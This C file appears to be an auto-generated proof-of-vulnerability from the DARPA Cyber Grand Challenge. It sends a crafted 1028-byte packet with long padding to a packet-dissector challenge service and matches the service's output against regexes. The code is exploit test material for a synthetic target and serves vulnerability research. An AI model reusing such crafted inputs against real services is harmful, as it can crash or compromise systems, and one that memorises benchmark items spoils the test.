#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x22\x56\x4d\x73"
         "\xd1\xbe\xde\x7a\xc0\x25\x6a\xdf\xaf\x0c\x67\xd2\xc6\x95\xa0\x6c"
         "\xca\x01\x00\x00\xde\x49\xdc\x93\xc8\xfa\x50\x95\xde\xc9\xd9\x10"
         "\x0a\xc7\xd5\x57\xb1\x61\x68\x50\xb7\xec\x3a\x0e\xc5\xf9\xc8\x91"
         "\xd0\x59\xc2\xd0\xfa\x3b\xc5\x33\x4a\x8f\x61\xaa\x8a\xb0\x72\x53"
         "\x3b\xaf\x62\x44\x07\x6b\x94\x43\xe7\xce\x29\x57\x1c\xf3\x13\x32"
         "\x62\xb9\x0d\x7e\xd1\x6e\x97\x69\xb6\xa3\x1e\x47\xbd\x49\xd7\xab"
         "\xae\x66\x35\x72\x33\x5b\x49\xae\xef\x3f\x72\xcf\x6c\x78\x4a\x86"
         "\xc6\x26\x73\x31\x16\x2c\xca\x5d\xdb\x85\xd9\x70\xea\xcb\x89\x83"
         "\xf2\x7e\x2e\x77\x2d\x4b\x6f\x68\xd5\x20\x5c\xfb\xab\x96\xa6\xe6"
         "\xa2\x6a\x73\x67\x72\xd1\x33\x72\x29\xab\xb1\xb2\x4c\x29\xb7\xd4"
         "\x96\x18\x88\x98\x51\xac\x41\x20\x96\x97\xed\x74\xbc\xf4\xe0\x2a"
         "\x70\xdc\x90\x18\xf4\xe3\xa6\x20\x58\x62\xa1\xe3\x58\x43\x11\xbb"
         "\xe5\x2d\xb2\xe7\x2e\x91\x3e\xa8\xf2\x95\x5e\x59\xce\x36\x94\x63"
         "\xf8\xcf\x9a\x41\xc2\xb0\xf4\x5e\xfe\xbd\x09\x1a\x67\x77\x57\x5a"
         "\x4a\x03\x2d\x48\x38\x92\x43\xe6\x25\x98\xfe\x7a\xd6\x5c\xa2\xac"
         "\x93\x62\xdb\x9c\x62\x5f\x50\x64\xfa\x1b\xc0\xb3\x95\xe9\xdb\x0c"
         "\xd9\xeb\x3d\x3e\x1c\x00\xfe\xb2\x2d\x1a\xb1\x43\x20\x96\x29\xc4"
         "\xc9\xe3\xcf\xbf\xc7\x4b\x9b\x24\xfd\xe3\x79\x17\x60\x7a\xc1\xbc"
         "\x9a\x71\xd9\x81\x9b\x91\x9f\x26\x10\xa4\xce\x64\xca\x67\x2c\xc5"
         "\x5f\x73\xb6\x94\xcb\x1b\x02\xc7\xd6\xc8\x7c\x2c\x29\x7b\xf0\x3e"
         "\x44\x7d\x31\x1d\xac\xce\x6c\xd3\x28\x02\xe0\xc4\x18\x77\xf0\x55"
         "\x2f\x10\x84\xbd\xdc\x09\x07\xc9\xf7\xca\xee\xe5\xcb\x73\x5b\x25"
         "\x24\xb2\x11\x5b\xf9\x2b\x55\x1e\x79\x4d\xb6\x0b\x96\xfd\x94\x79"
         "\xd1\x6f\xee\xf0\x5c\xe7\x7f\xcc\xbb\x60\x89\xe1\x53\xd6\xd1\xc6"
         "\x56\xfd\xde\x6c\x74\x93\xce\xd2\x03\x88\x6c\xfd\xdd\x4c\xc5\x16"
         "\xe9\x8a\x1a\x72\xb9\xe7\xe9\x76\x4d\xf3\xdc\x9a\x76\xa3\x45\x2e"
         "\x97\x45\x34\xcd\x5f\x9c\x8d\x0b\x68\xb1\xc8\x12\x3b\x4a\xab\x71"
         "\x20\x52\x71\x14\xeb\xd8\xae\x37\xc7\x7e\xbf\x76\xdc\xc3\x4a\x57"
         "\x1c\xfa\x56\xad\x09\xf2\x4a\xc1\x4b\x42\x0b\x48\x4f\x8b\x90\x2c"
         "\xf6\x4b\x9f\x63\x7d\x61\x0e\x67\x45\x8c\x9f\x6e\x33\xc2\x11\x02"
         "\x47\xb2\x05\x42\xaf\x70\x07\xc7\x53\x1b\x1c\x69\xb3\x86\xff\xcf"
         "\x50\x8f\xa8\x4c\xf3\xdc\x40\xb0\x3e\x72\x7c\x72\x38\x8a\x33\x89"
         "\x83\x44\xae\x80\xe6\xfe\x09\xd7\x9a\x61\xc9\xae\xd7\x3f\x3a\xff"
         "\x6a\xf0\xf4\xe5\x3b\x4b\xb9\x93\x76\x7b\x7a\x25\xc2\x13\x54\xd2"
         "\xb3\x23\x99\x6a\x9c\x09\x13\xc2\x1d\x75\x4d\xbe\xa7\x05\x36\xa9"
         "\x66\x2c\xe7\x0a\xa2\x05\x4e\x98\x86\x9f\xd3\x03\x6c\xd3\xb8\x23"
         "\x66\xd0\x3c\xb3\x6c\x25\x98\x2d\xb2\x83\x82\x4c\xea\x1a\x7d\xf6"
         "\xfc\xb0\xef\x8d\x32\x21\x5e\x82\x10\xe9\xbf\x30\x98\x3b\xa9\x91"
         "\x4f\xb8\xe4\xd7\xdc\xde\x1c\x00\x81\x97\x2e\xd8\xa7\x28\x43\x7d"
         "\x03\x9e\x4e\x4f\xa4\x87\xa4\x1c\xbb\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===subordinationbrachial
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x73\x75\x62\x6f\x72\x64\x69\x6e\x61\x74\x69"
         "\x6f\x6e\x62\x72\x61\x63\x68\x69\x61\x6c";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
